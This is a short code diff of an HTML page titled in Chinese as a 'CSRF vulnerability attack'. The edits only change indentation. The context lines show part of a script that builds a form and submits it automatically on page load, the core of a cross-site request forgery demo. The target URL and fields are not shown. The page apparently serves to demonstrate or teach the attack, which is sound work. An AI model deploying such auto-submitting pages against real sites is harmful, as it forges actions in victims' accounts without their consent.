@@ -7,8 +7,8 @@
     <title>Document</title>
 </head>
 <body>
-    <h1>csrf漏洞攻击</h1>
-    <script>
+<h1>csrf漏洞攻击</h1>
+<script>
         function post(url, fields){
             var f = document.createElement("form");
             f.action = url
@@ -29,6 +29,7 @@
             post(url, fields);
         }
     window.onload = function() { csrf(); }
-    </script>
+
+</script>
 </body>
 </html>
